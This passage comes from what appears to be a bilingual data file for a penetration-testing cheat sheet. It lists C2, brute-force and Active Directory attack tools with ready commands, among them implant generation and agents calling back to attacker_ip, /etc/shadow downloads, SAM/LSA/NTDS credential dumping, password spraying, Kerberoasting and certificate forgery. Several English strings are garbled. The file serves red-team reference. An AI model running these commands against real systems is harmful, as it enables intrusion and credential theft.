        description: { zh: '获取Beacon后的常用后渗透命令', en: 'Common post-exploitation commands after getting a Beacon' },
        platform: 'windows'
      },
      {
        name: 'Malleable C2',
        command: '# 使用C2 Profile伪装流量:\n# https://github.com/rsmudge/Malleable-C2-Profiles\n./teamserver ip pass jquery-c2.4.0.profile',
        description: { zh: '使用Malleable C2 Profile伪装通信流量', en: 'Disguise C2 traffic using Malleable C2 Profiles' },
        platform: 'linux'
      }
    ],
    references: ['https://www.cobaltstrike.com/']
  },
  {
    id: 'sliver',
    name: 'Sliver',
    description: { zh: '开源跨平台红队C2框架，Cobalt Strike替代品', en: 'Open-source cross-platform red team C2 framework, Cobalt Strike alternative' },
    category: { zh: '漏洞利用', en: 'Exploitation' },
    installation: 'curl https://sliver.sh/install | sudo bash / go install github.com/BishopFox/sliver/client@latest',
    commands: [
      {
        name: { zh: '启动服务', en: 'Start Service' },
        command: 'sliver-server',
        description: { zh: '启动Sliver服务端', en: 'Start Sliver server' },
        platform: 'linux'
      },
      {
        name: { zh: '生成Implant', en: 'Generate Implant' },
        command: '# 在Sliver控制台:\ngenerate --mtls attacker_ip --os windows --arch amd64 --save implant.exe\ngenerate --http attacker_ip --os linux --format shared --save implant.so',
        description: { zh: '生成各平台的植入体', en: 'Generate implants for each platform' },
        platform: 'all'
      },
      {
        name: { zh: '启动监听', en: 'Start Listener' },
        command: 'mtls -l 8888\nhttps -l 443 -d example.com\nwg -l 51820',
        description: { zh: '启动mTLS/HTTPS/WireGuard监听器', en: 'Start mTLS/HTTPS/WireGuard listener' },
        platform: 'all'
      },
      {
        name: { zh: '后渗透命令', en: 'Post-Exploitation Commands' },
        command: '# 获取Session后:\ninfo\ngetuid\nps\ndownload /etc/shadow\nupload local_file /tmp/remote\nexecute -o whoami\npivots tcp --bind 0.0.0.0:9050',
        description: { zh: '常用后渗透操作命令', en: 'Common post-exploitation commands' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/BishopFox/sliver']
  },
  {
    id: 'mythic',
    name: 'Mythic',
    description: { zh: '模块化C2框架，支持多种Agent和自定义扩展', en: 'Modular C2 framework supporting multiple agents and custom extensions' },
    category: { zh: '漏洞利用', en: 'Exploitation' },
    installation: 'git clone https://github.com/its-a-feature/Mythic && cd Mythic && ./install_docker_ubuntu.sh && sudo ./mythic-cli start',
    commands: [
      {
        name: { zh: '安装Agent', en: 'Install Agent' },
        command: 'sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo\nsudo ./mythic-cli install github https://github.com/MythicAgents/Poseidon',
        description: { zh: '安装Apollo(Windows)或Poseidon(Linux) Agent', en: 'InstallationApollo(Windows) or Poseidon(Linux) Agent' },
        platform: 'linux'
      },
      {
        name: { zh: '访问Web界面', en: 'Access Web Interface' },
        command: 'https://attacker_ip:7443\n# 默认账号: mythic_admin\n# 密码查看: cat .env | grep MYTHIC_ADMIN_PASSWORD',
        description: { zh: '通过Web界面管理C2操作', en: 'Manage C2 operations via the web interface' },
        platform: 'all'
      },
      {
        name: { zh: '生成Payload', en: 'Generate Payload' },
        command: '# 在Web界面:\n# 1. 创建Payload Profile\n# 2. 选择Agent类型(Apollo/Poseidon等)\n# 3. 配置C2 Profile\n# 4. 生成Payload下载',
        description: { zh: '通过图形界面配置和生成Payload', en: 'Configure and generate payloads via the GUI' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/its-a-feature/Mythic']
  },
  {
    id: 'medusa',
    name: 'Medusa',
    description: { zh: '快速并行网络登录暴力破解工具', en: 'Fast parallel network login brute-force tool' },
    category: { zh: '密码攻击', en: 'Password Attacks' },
    installation: 'apt install medusa',
    commands: [
      {
        name: { zh: 'SSH爆破', en: 'SSH Brute Force' },
        command: 'medusa -h target_ip -u admin -P passwords.txt -M ssh -t 4',
        description: { zh: '4线程SSH密码暴力破解', en: '4-thread SSH password brute force' },
        syntaxBreakdown: [
          { part: 'medusa', explanation: { zh: '并行网络登录破解工具', en: 'and lineNetwork login brute force tool' }, type: 'command' },
          { part: '-h', explanation: { zh: '目标主机', en: 'Target host' }, type: 'parameter' },
          { part: '-u', explanation: { zh: '用户名', en: 'Username' }, type: 'parameter' },
          { part: '-P', explanation: { zh: '密码字典文件', en: 'Password wordlist file' }, type: 'parameter' },
          { part: '-M ssh', explanation: { zh: '指定协议模块', en: 'Specify protocol module' }, type: 'parameter' },
          { part: '-t 4', explanation: { zh: '并发线程数', en: 'Concurrent thread count' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: { zh: 'RDP爆破', en: 'RDP Brute Force' },
        command: 'medusa -h target_ip -U users.txt -P passwords.txt -M rdp -t 2',
        description: { zh: 'RDP远程桌面密码破解', en: 'RDP remote desktop password cracking' },
        platform: 'all'
      },
      {
        name: { zh: 'FTP爆破', en: 'FTP Brute Force' },
        command: 'medusa -h target_ip -U users.txt -P passwords.txt -M ftp -f',
        description: { zh: 'FTP破解(找到密码后停止)', en: 'FTP brute force (stop after finding password)' },
        platform: 'all'
      },
      {
        name: { zh: '批量爆破', en: 'Batch Brute Force' },
        command: 'medusa -H hosts.txt -U users.txt -P pass.txt -M ssh -t 3 -T 5',
        description: { zh: '批量主机爆破(5台并行)', en: 'Batch host brute force (5 hosts in parallel)' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/jmk-foofus/medusa']
  },
  {
    id: 'ncrack',
    name: 'Ncrack',
    description: { zh: 'Nmap项目出品的高速网络认证破解工具', en: 'High-speed network authentication cracking tool by the Nmap project' },
    category: { zh: '密码攻击', en: 'Password Attacks' },
    installation: { zh: 'apt install ncrack / 源码编译', en: 'apt install ncrack / build from source' },
    commands: [
      {
        name: { zh: 'SSH爆破', en: 'SSH Brute Force' },
        command: 'ncrack -vv -U users.txt -P passwords.txt ssh://target_ip',
        description: { zh: 'SSH认证暴力破解', en: 'SSH authentication brute force' },
        syntaxBreakdown: [
          { part: 'ncrack', explanation: { zh: '高速网络认证破解工具', en: 'High-speed network authentication cracking tool' }, type: 'command' },
          { part: '-vv', explanation: { zh: '详细输出', en: 'Verbose Output' }, type: 'parameter' },
          { part: 'ssh://target_ip', explanation: { zh: '协议://目标格式', en: 'Protocol://TargetFormat' }, type: 'value' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '多服务爆破', en: 'Multi-Service Brute Force' },
        command: 'ncrack -U users.txt -P pass.txt ssh://10.0.0.1 rdp://10.0.0.2 ftp://10.0.0.3',
        description: { zh: '同时破解多个目标的不同服务', en: 'Crack multiple targets with different services simultaneously' },
        platform: 'all'
      },
      {
        name: { zh: '联动Nmap', en: 'Combined with Nmap' },
        command: 'ncrack -iX nmap_scan.xml -U users.txt -P pass.txt',
        description: { zh: '直接导入Nmap扫描结果进行破解', en: 'Import Nmap scan results directly for cracking' },
        platform: 'all'
      }
    ],
    references: ['https://nmap.org/ncrack/']
  },
  {
    id: 'crowbar',
    name: 'Crowbar',
    description: { zh: '专注RDP/VNC/SSH密钥/OpenVPN的暴力破解工具', en: 'Brute-force tool focused on RDP/VNC/SSH keys/OpenVPN' },
    category: { zh: '密码攻击', en: 'Password Attacks' },
    installation: 'apt install crowbar / pip3 install crowbar',
    commands: [
      {
        name: { zh: 'RDP爆破', en: 'RDP Brute Force' },
        command: 'crowbar -b rdp -s target_ip/32 -u admin -C passwords.txt -n 2',
        description: { zh: 'RDP密码暴力破解(2线程)', en: 'RDP password brute force (2 threads)' },
        syntaxBreakdown: [
          { part: '-b rdp', explanation: { zh: '指定协议类型', en: 'Specify protocol type' }, type: 'parameter' },
          { part: '-s', explanation: { zh: '目标IP/CIDR', en: 'TargetIP/CIDR' }, type: 'parameter' },
          { part: '-n 2', explanation: { zh: '并发连接数', en: 'Concurrent connection count' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: { zh: 'SSH密钥爆破', en: 'SSH Key Brute Force' },
        command: 'crowbar -b sshkey -s target_ip/32 -u root -k /path/to/keys/',
        description: { zh: '尝试多个SSH私钥登录', en: 'Try multiple SSH private keys for login' },
        platform: 'all'
      },
      {
        name: { zh: 'VNC爆破', en: 'VNC Brute Force' },
        command: 'crowbar -b vnckey -s target_ip/32 -p password -k /path/to/keys/',
        description: { zh: 'VNC认证暴力破解', en: 'VNC authentication brute force' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/galkan/crowbar']
  },
  {
    id: 'patator',
    name: 'Patator',
    description: { zh: '多用途模块化暴力破解工具，支持数十种协议', en: 'Multi-purpose modular brute-force tool supporting dozens of protocols' },
    category: { zh: '密码攻击', en: 'Password Attacks' },
    installation: 'apt install patator / pip3 install patator',
    commands: [
      {
        name: { zh: 'SSH爆破', en: 'SSH Brute Force' },
        command: 'patator ssh_login host=target_ip user=FILE0 password=FILE1 0=users.txt 1=passwords.txt',
        description: { zh: 'SSH登录暴力破解', en: 'SSH login brute force' },
        syntaxBreakdown: [
          { part: 'ssh_login', explanation: { zh: '使用SSH登录模块', en: 'UseSSHLoginModule' }, type: 'command' },
          { part: 'FILE0/FILE1', explanation: { zh: '引用字典文件(0和1编号)', en: 'Reference dictionary files (numbered 0 and 1)' }, type: 'variable' },
        ],
        platform: 'all'
      },
      {
        name: { zh: 'HTTP表单爆破', en: 'HTTP Form Brute Force' },
        command: 'patator http_fuzz url="https://target.com/login" method=POST body="user=FILE0&pass=FILE1" 0=users.txt 1=pass.txt -x ignore:fgrep="Login failed"',
        description: { zh: 'HTTP登录表单暴力破解', en: 'Brute force HTTP login form' },
        platform: 'all'
      },
      {
        name: { zh: 'FTP爆破', en: 'FTP Brute Force' },
        command: 'patator ftp_login host=target_ip user=admin password=FILE0 0=passwords.txt',
        description: { zh: 'FTP密码暴力破解', en: 'FTP password brute force' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/lanjelot/patator']
  },
  {
    id: 'crackstation',
    name: 'CrackStation',
    description: { zh: '在线哈希查询和离线超大字典', en: 'Online hash lookup and offline mega-dictionary' },
    category: { zh: '密码攻击', en: 'Password Attacks' },
    installation: { zh: '在线: https://crackstation.net / 下载字典: https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm', en: 'Online: https://crackstation.net / Download wordlist: https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm' },
    commands: [
      {
        name: { zh: '在线查询', en: 'Online Lookup' },
        command: '# 访问 https://crackstation.net\n# 输入哈希值(支持MD5/SHA1/SHA256等)\n# 支持批量查询(每行一个哈希)',
        description: { zh: '在线哈希值反查明文密码', en: 'Online reverse hash lookup for plaintext passwords' },
        platform: 'all'
      },
      {
        name: { zh: '下载字典', en: 'Download Wordlist' },
        command: '# CrackStation字典(15GB+):\n# https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm\n# 配合hashcat使用:\nhashcat -m 0 hashes.txt crackstation.txt',
        description: { zh: '使用CrackStation超大字典离线破解', en: 'Offline cracking with the CrackStation mega-dictionary' },
        platform: 'all'
      },
      { name: { zh: '配合 hashcat 本地破解', en: 'Use with hashcat offline' }, command: 'hashcat -m 0 hash.txt crackstation.txt\nhashcat -m 100 hash.txt crackstation-human-only.txt', description: { zh: '使用 CrackStation 字典本地破解哈希', en: 'Crack hashes offline using the CrackStation wordlist' }, platform: 'linux' },
      { name: { zh: '下载字典', en: 'Download wordlist' }, command: 'wget https://crackstation.net/files/crackstation.txt.gz\nwget https://crackstation.net/files/crackstation-human-only.txt.gz', description: { zh: '下载 CrackStation 哈希字典', en: 'Download the CrackStation hash dictionary' }, platform: 'linux' },
    ],
    references: ['https://crackstation.net']
  },
  {
    id: 'seclists',
    name: { zh: 'SecLists字典', en: 'SecLists Wordlists' },
    description: { zh: '安全测试人员必备的字典集合(目录、密码、用户名、Payload等)', en: 'Essential wordlist collection for security testers (directories, passwords, usernames, payloads, etc.)' },
    category: { zh: '密码攻击', en: 'Password Attacks' },
    installation: 'apt install seclists / git clone https://github.com/danielmiessler/SecLists',
    commands: [
      {
        name: { zh: '常用路径', en: 'Common Paths' },
        command: '# 目录字典:\n/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n/usr/share/seclists/Discovery/Web-Content/common.txt\n\n# 密码字典:\n/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt\n\n# 用户名:\n/usr/share/seclists/Usernames/top-usernames-shortlist.txt',
        description: { zh: 'SecLists常用字典路径', en: 'SecLists common wordlist paths' },
        platform: 'linux'
      },
      {
        name: { zh: '特殊用途', en: 'Special Purpose' },
        command: '# Fuzzing Payload:\n/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt\n/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt\n\n# 子域名:\n/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n\n# 参数名:\n/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt',
        description: { zh: '特殊用途字典(LFI/SQLi/子域名/参数)', en: 'Special PurposeDictionary(LFI/SQLi/Sub-Domain name/Parameter)' },
        platform: 'linux'
      },
      { name: { zh: '常用路径速查', en: 'Common path reference' }, command: '/usr/share/seclists/Discovery/Web-Content/common.txt\n/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt\n/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt', description: { zh: 'SecLists 常用字典路径速查', en: 'Quick reference for common SecLists wordlist paths' }, platform: 'linux' },
      { name: { zh: '克隆仓库', en: 'Clone repository' }, command: 'git clone --depth 1 https://github.com/danielmiessler/SecLists /usr/share/seclists', description: { zh: '克隆 SecLists 到系统目录', en: 'Clone SecLists to system directory' }, platform: 'linux' },
      { name: { zh: '模糊测试专用字典', en: 'Fuzzing wordlists' }, command: '/usr/share/seclists/Fuzzing/\n/usr/share/seclists/Fuzzing/SQLi/\n/usr/share/seclists/Fuzzing/XSS/\n/usr/share/seclists/Fuzzing/LFI/', description: { zh: 'SecLists 注入和模糊测试字典目录', en: 'SecLists injection and fuzzing wordlist directories' }, platform: 'linux' },
    ],
    references: ['https://github.com/danielmiessler/SecLists']
  },
  {
    id: 'rockyou',
    name: { zh: 'RockYou字典', en: 'RockYou Wordlist' },
    description: { zh: '来自2009年RockYou数据泄露的经典密码字典(1400万+)', en: 'Classic password dictionary from the 2009 RockYou data breach (14M+ entries)' },
    category: { zh: '密码攻击', en: 'Password Attacks' },
    installation: { zh: '# Kali自带: gzip -d /usr/share/wordlists/rockyou.txt.gz / 或下载: https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt', en: '# Kali built-in: gzip -d /usr/share/wordlists/rockyou.txt.gz / Or download: https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt' },
    commands: [
      {
        name: { zh: '解压使用', en: 'Extract and Use' },
        command: 'gzip -d /usr/share/wordlists/rockyou.txt.gz\nwc -l /usr/share/wordlists/rockyou.txt  # 约14344392行',
        description: { zh: '解压Kali自带的rockyou字典', en: 'Decompress the Kali built-in rockyou dictionary' },
        platform: 'linux'
      },
      {
        name: { zh: '配合工具', en: 'Combined with Tools' },
        command: '# Hashcat:\nhashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt\n\n# John:\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n\n# Hydra:\nhydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target',
        description: { zh: '配合各种密码破解工具使用', en: 'Use with various password cracking tools' },
        platform: 'all'
      },
      { name: { zh: '解压并使用', en: 'Extract and use' }, command: 'gunzip /usr/share/wordlists/rockyou.txt.gz\nwc -l /usr/share/wordlists/rockyou.txt  # ~14 million passwords', description: { zh: '解压 rockyou 字典', en: 'Extract the rockyou wordlist' }, platform: 'linux' },
      { name: { zh: '自定义规则增强', en: 'Enhance with rules' }, command: 'hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule\njohn --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 hash.txt', description: { zh: '配合规则文件增强 rockyou 破解效果', en: 'Enhance rockyou cracking with rule files' }, platform: 'linux' },
      { name: { zh: '过滤生成子集', en: 'Filter to subset' }, command: "grep -E '^.{8,12}$' /usr/share/wordlists/rockyou.txt > rockyou-8-12.txt\ngrep -E '[A-Z]' /usr/share/wordlists/rockyou.txt | grep -E '[0-9]' > rockyou-complex.txt", description: { zh: '按规则从 rockyou 提取子集', en: 'Extract a subset from rockyou by pattern' }, platform: 'linux' },
    ],
    references: ['https://github.com/brannondorsey/naive-hashcat/releases']
  },
  {
    id: 'netexec',
    name: 'NetExec',
    description: { zh: 'CrackMapExec的继任者，网络渗透测试自动化工具', en: 'Successor to CrackMapExec, automated network penetration testing tool' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: 'pip3 install netexec / pipx install netexec',
    commands: [
      {
        name: { zh: 'SMB枚举', en: 'SMB Enumeration' },
        command: 'nxc smb 10.0.0.0/24 -u user -p password --shares\nnxc smb 10.0.0.0/24 -u user -p password --users',
        description: { zh: 'SMB共享和用户枚举', en: 'SMBShares and User Enumeration' },
        syntaxBreakdown: [
          { part: 'nxc', explanation: { zh: 'NetExec命令行工具', en: 'NetExec command-line tool' }, type: 'command' },
          { part: 'smb', explanation: { zh: '指定SMB协议', en: 'specifiedSMBProtocol' }, type: 'parameter' },
          { part: '--shares', explanation: { zh: '枚举共享目录', en: 'Enumerate shared directories' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '密码喷射', en: 'Password Spraying' },
        command: 'nxc smb 10.0.0.0/24 -u users.txt -p "Password123!" --continue-on-success',
        description: { zh: '使用单一密码对多用户进行喷射', en: 'Spray a single password against multiple users' },
        platform: 'all'
      },
      {
        name: { zh: '命令执行', en: 'Command Execution' },
        command: 'nxc smb target_ip -u admin -p password -x "whoami"\nnxc winrm target_ip -u admin -p password -X "Get-Process"',
        description: { zh: '通过SMB/WinRM执行命令', en: 'throughSMB/WinRMExecute Command' },
        platform: 'all'
      },
      {
        name: { zh: '提取凭证', en: 'Extract Credentials' },
        command: 'nxc smb target_ip -u admin -p password --sam\nnxc smb target_ip -u admin -p password --lsa\nnxc smb target_ip -u admin -p password --ntds',
        description: { zh: '提取SAM/LSA/NTDS中的凭证', en: 'ExtractSAM/LSA/NTDSMiddle Credentials' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/Pennyw0rth/NetExec']
  },
  {
    id: 'ligolo-ng',
    name: 'Ligolo-ng',
    description: { zh: '高级内网隧道代理工具，基于TUN接口', en: 'Advanced intranet tunneling and proxy tool based on TUN interface' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: { zh: '下载: https://github.com/nicocha30/ligolo-ng/releases', en: 'Download: https://github.com/nicocha30/ligolo-ng/releases' },
    commands: [
      {
        name: { zh: '攻击机设置', en: 'Attacker Setup' },
        command: '# 创建TUN接口\nsudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n\n# 启动代理服务\n./proxy -selfcert -laddr 0.0.0.0:11601',
        description: { zh: '在攻击机上配置TUN接口和启动代理', en: 'Configure TUN interface and start proxy on the attacker machine' },
        syntaxBreakdown: [
          { part: 'ip tuntap add', explanation: { zh: '创建TUN虚拟网络接口', en: 'Create a TUN virtual network interface' }, type: 'command' },
          { part: '-selfcert', explanation: { zh: '使用自签名证书', en: 'Use a self-signed certificate' }, type: 'parameter' },
        ],
        platform: 'linux'
      },
      {
        name: { zh: '目标机连接', en: 'Target Connection' },
        command: './agent -connect attacker_ip:11601 -ignore-cert',
        description: { zh: '在目标机运行Agent连接回攻击机', en: 'Run agent on target to connect back to the attacker' },
        platform: 'all'
      },
      {
        name: { zh: '添加路由', en: 'Add Route' },
        command: '# 在Ligolo控制台:\nsession\nstart\n# 在攻击机添加路由:\nsudo ip route add 10.10.10.0/24 dev ligolo',
        description: { zh: '配置路由实现内网直通', en: 'Configure routes for direct intranet access' },
        platform: 'linux'
      }
    ],
    references: ['https://github.com/nicocha30/ligolo-ng']
  },
  {
    id: 'sharphound',
    name: 'SharpHound',
    description: { zh: 'BloodHound的C#数据收集器，在Windows域内收集AD信息', en: 'BloodHound C# data collector for AD information in Windows domains' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: { zh: '下载: https://github.com/BloodHoundAD/SharpHound/releases', en: 'Download: https://github.com/BloodHoundAD/SharpHound/releases' },
    commands: [
      {
        name: { zh: '全量收集', en: 'Full Collection' },
        command: '.\\SharpHound.exe -c All',
        description: { zh: '收集所有AD域信息(用户/组/ACL/Session等)', en: 'CollectallADDomain Info(Users/Groups/ACL/Session etc.)' },
        syntaxBreakdown: [
          { part: '-c All', explanation: { zh: '收集所有类型的数据', en: 'CollectallType Data' }, type: 'parameter' },
        ],
        platform: 'windows'
      },
      {
        name: { zh: '隐蔽收集', en: 'Stealth Collection' },
        command: '.\\SharpHound.exe -c DCOnly --NoSaveCache --RandomFilenames --MemCache',
        description: { zh: '仅从DC收集，不保存缓存，随机文件名', en: 'Only from DCCollect, not SaveCache, randomFilename' },
        platform: 'windows'
      },
      {
        name: { zh: 'Session收集', en: 'Session Collection' },
        command: '.\\SharpHound.exe -c Session --Loop --LoopDuration 02:00:00 --LoopInterval 00:05:00',
        description: { zh: '循环收集Session信息(2小时，每5分钟一次)', en: 'Periodically collect session info (2 hours, every 5 minutes)' },
        platform: 'windows'
      },
      {
        name: { zh: '指定域', en: 'Specify Domain' },
        command: '.\\SharpHound.exe -c All -d child.domain.com --LdapUsername user --LdapPassword pass',
        description: { zh: '收集指定子域的信息', en: 'CollectspecifiedSub-Domain Information' },
        platform: 'windows'
      }
    ],
    references: ['https://github.com/BloodHoundAD/SharpHound']
  },
  {
    id: 'bloodhound-python',
    name: 'BloodHound-Python',
    description: { zh: 'BloodHound的Python数据收集器，可从Linux远程收集AD信息', en: 'BloodHound Python collector for remote AD data collection from Linux' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: 'pip3 install bloodhound',
    commands: [
      {
        name: { zh: '远程收集', en: 'Remote Collection' },
        command: 'bloodhound-python -d domain.com -u user -p password -ns dc_ip -c All',
        description: { zh: '从Linux远程收集AD域全量信息', en: 'Remotely collect full AD domain information from Linux' },
        syntaxBreakdown: [
          { part: '-d', explanation: { zh: '目标域名', en: 'Target domain' }, type: 'parameter' },
          { part: '-ns', explanation: { zh: 'DNS服务器(通常是DC)', en: 'DNSServer(Usually is DC)' }, type: 'parameter' },
          { part: '-c All', explanation: { zh: '收集所有类型数据', en: 'Collect all data types' }, type: 'parameter' },
        ],
        platform: 'linux'
      },
      {
        name: { zh: '使用哈希', en: 'Using Hash' },
        command: 'bloodhound-python -d domain.com -u user --hashes aad3b435b51404eeaad3b435b51404ee:ntlm_hash -ns dc_ip -c All',
        description: { zh: '使用NTLM哈希进行Pass-the-Hash收集', en: 'Collect using Pass-the-Hash with NTLM hash' },
        platform: 'linux'
      },
      {
        name: { zh: '指定收集类型', en: 'Specify Collection Type' },
        command: 'bloodhound-python -d domain.com -u user -p pass -ns dc_ip -c Group,LocalAdmin,Session',
        description: { zh: '仅收集组、本地管理员和会话信息', en: 'Collect only groups, local admins, and sessions' },
        platform: 'linux'
      }
    ],
    references: ['https://github.com/fox-it/BloodHound.py']
  },
  {
    id: 'rubeus',
    name: 'Rubeus',
    description: { zh: 'Kerberos攻击工具集，用于票据操作和Kerberos攻击', en: 'Kerberos attack toolkit for ticket operations and Kerberos attacks' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: { zh: '编译: https://github.com/GhostPack/Rubeus / 或使用预编译版', en: 'Compile: https://github.com/GhostPack/Rubeus / Or use pre-compiled binaries' },
    commands: [
      {
        name: 'Kerberoasting',
        command: 'Rubeus.exe kerberoast /outfile:hashes.txt\nRubeus.exe kerberoast /user:svc_sql /outfile:hash.txt',
        description: { zh: '请求服务票据用于离线破解', en: 'Request service tickets for offline cracking' },
        syntaxBreakdown: [
          { part: 'kerberoast', explanation: { zh: '请求TGS票据进行离线破解', en: 'Request TGS tickets for offline cracking' }, type: 'command' },
          { part: '/outfile', explanation: { zh: '保存哈希到文件', en: 'Savehash to File' }, type: 'parameter' },
        ],
        platform: 'windows'
      },
      {
        name: 'AS-REP Roasting',
        command: 'Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt',
        description: { zh: '对不需要预认证的账户请求AS-REP', en: 'Request AS-REP for accounts with pre-authentication disabled' },
        platform: 'windows'
      },
      {
        name: 'Pass-the-Ticket',
        command: 'Rubeus.exe ptt /ticket:base64_ticket\nRubeus.exe ptt /ticket:ticket.kirbi',
        description: { zh: '导入Kerberos票据', en: 'Import Kerberos ticket' },
        platform: 'windows'
      },
      {
        name: { zh: '请求TGT', en: 'Request TGT' },
        command: 'Rubeus.exe asktgt /user:user /password:pass /enctype:aes256 /ptt\nRubeus.exe asktgt /user:user /rc4:ntlm_hash /ptt',
        description: { zh: '使用密码或哈希请求TGT票据', en: 'UsePassword or hashRequest TGTTicket' },
        platform: 'windows'
      },
      {
        name: { zh: '委派攻击', en: 'Delegation Attack' },
        command: 'Rubeus.exe s4u /user:svc$ /rc4:hash /impersonateuser:admin /msdsspn:cifs/target /ptt',
        description: { zh: 'S4U约束委派攻击', en: 'S4UConstrained Delegation Attack' },
        platform: 'windows'
      }
    ],
    references: ['https://github.com/GhostPack/Rubeus']
  },
  {
    id: 'certipy',
    name: 'Certipy',
    description: { zh: 'AD CS(Active Directory证书服务)攻击工具', en: 'AD CS (Active Directory Certificate Services) attack tool' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: 'pip3 install certipy-ad',
    commands: [
      {
        name: { zh: '枚举证书模板', en: 'Enumerate Certificate Templates' },
        command: 'certipy find -u user@domain.com -p password -dc-ip dc_ip -enabled -vulnerable',
        description: { zh: '枚举可利用的证书模板', en: 'Enumerate exploitable certificate templates' },
        syntaxBreakdown: [
          { part: 'find', explanation: { zh: '枚举模式', en: 'Enumeration mode' }, type: 'command' },
          { part: '-vulnerable', explanation: { zh: '仅显示可利用的模板', en: 'Show only exploitable templates' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: { zh: 'ESC1攻击', en: 'ESC1 Attack' },
        command: 'certipy req -u user@domain.com -p password -ca CA-NAME -template VULN_TEMPLATE -upn admin@domain.com',
        description: { zh: 'ESC1: 利用允许SAN的模板伪造管理员证书', en: 'ESC1: Exploit SAN-enabled template to forge admin certificate' },
        platform: 'all'
      },
      {
        name: { zh: '认证获取哈希', en: 'Authenticate to Get Hash' },
        command: 'certipy auth -pfx admin.pfx -dc-ip dc_ip',
        description: { zh: '使用证书进行PKINIT认证获取NT Hash', en: 'Use certificate for PKINIT authentication to get NT hash' },
        platform: 'all'
      },
      {
        name: 'Shadow Credentials',
        command: 'certipy shadow auto -u user@domain.com -p password -account target_user',
        description: { zh: 'Shadow Credentials攻击获取目标用户凭证', en: 'Shadow credentials attack to obtain target user credentials' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/ly4k/Certipy']
  },
  {
    id: 'lazagne-tool',
    name: 'LaZagne',
    description: { zh: '自动化本地密码恢复工具，支持数十种应用', en: 'Automated local password recovery tool supporting dozens of applications' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: { zh: '下载: https://github.com/AlessandroZ/LaZagne/releases', en: 'Download: https://github.com/AlessandroZ/LaZagne/releases' },
    commands: [
      {
        name: { zh: '全量提取', en: 'Full Extraction' },
        command: 'lazagne.exe all',
        description: { zh: '提取所有支持应用的密码', en: 'ExtractallsupportsApplication Password' },
        syntaxBreakdown: [
          { part: 'all', explanation: { zh: '搜索所有支持的应用程序', en: 'Searchallsupports Application' }, type: 'parameter' },
        ],
        platform: 'windows'
      },
      {
        name: { zh: '指定类别', en: 'Specify Category' },
        command: 'lazagne.exe browsers\nlazagne.exe wifi\nlazagne.exe databases\nlazagne.exe sysadmin',
        description: { zh: '仅提取指定类别的密码', en: 'Extract passwords for a specific category only' },
        platform: 'windows'
      },
      {
        name: { zh: 'Linux版本', en: 'Linux Version' },
        command: 'python3 lazagne.py all\npython3 lazagne.py browsers',
        description: { zh: 'Linux版本使用方式', en: 'Linux usage' },
        platform: 'linux'
      }
    ],
    references: ['https://github.com/AlessandroZ/LaZagne']
  },
  {
    id: 'seatbelt',
    name: 'Seatbelt',
    description: { zh: 'C#安全审计工具，快速收集Windows系统安全相关信息', en: 'C# security audit tool for rapidly collecting Windows system security information' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: { zh: '编译: https://github.com/GhostPack/Seatbelt / 或使用预编译版', en: 'Compile: https://github.com/GhostPack/Seatbelt / Or use pre-compiled binaries' },
    commands: [
      {
        name: { zh: '全量审计', en: 'Full Audit' },
        command: 'Seatbelt.exe -group=all -full',
        description: { zh: '执行所有安全检查', en: 'Run all security checks' },
        syntaxBreakdown: [
          { part: '-group=all', explanation: { zh: '运行所有检查组', en: 'Run all check groups' }, type: 'parameter' },
          { part: '-full', explanation: { zh: '详细输出模式', en: 'Verbose output mode' }, type: 'parameter' },
        ],
        platform: 'windows'
      },
      {
        name: { zh: '快速检查', en: 'Quick Check' },
        command: 'Seatbelt.exe -group=system -group=user',
        description: { zh: '检查系统和用户相关安全配置', en: 'CheckSystem and UsersrelatedSecurity Configuration' },
        platform: 'windows'
      },
      {
        name: { zh: '指定模块', en: 'Specify Module' },
        command: 'Seatbelt.exe CredEnum WindowsVault SavedRDPConnections RecentFiles',
        description: { zh: '运行指定的检查模块', en: 'Runspecified CheckModule' },
        platform: 'windows'
      },
      {
        name: { zh: '远程执行', en: 'Remote Execution' },
        command: 'Seatbelt.exe -group=remote -computername=target -username=admin -password=pass',
        description: { zh: '远程执行安全审计', en: 'Run security audit remotely' },
        platform: 'windows'
      }
    ],
